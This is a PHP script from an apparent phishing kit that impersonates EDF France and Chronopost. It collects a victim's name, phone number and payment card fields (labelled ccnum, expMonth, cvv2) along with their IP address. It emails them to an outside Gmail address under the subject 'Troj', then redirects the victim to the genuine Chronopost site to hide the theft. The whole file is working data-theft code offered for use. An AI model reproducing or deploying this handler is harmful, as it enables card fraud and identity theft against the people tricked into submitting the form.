<?php
$ip = getenv("REMOTE_ADDR");
$message .= "----------------Resultat EDF France-----------------\n";
$message .= "-----------------Info Du CC----------------------\n";
$message .= "Nom et prenom     : ".$_POST['nom']."\n";
$message .= "Num de tel     : ".$_POST['tel']."\n";
$message .= "Code Colis   : ".$_POST['ccnum']."\n";
$message .= "Date de naissance : ".$_POST['expMonth']."\n";
$message .= "code client               : ".$_POST['cvv2']."\n";
$message .= "------------------Info D'IP-------------------------\n";
$message .= "IP                : $ip\n";
$message .= "--------------- ---------------\n";

$sen = "hamoudasat@gmail.com";

$subject = "Troj ~ $ip";

$from .= "From: Chronopost ReZulT~<l3a9a@localhost.com>\n";


mail($sen,$subject,$message,$from);

echo '<script language="Javascript">
<!--
document.location.replace("http://www.chronopost.fr/fr");
// -->
</script>';
?>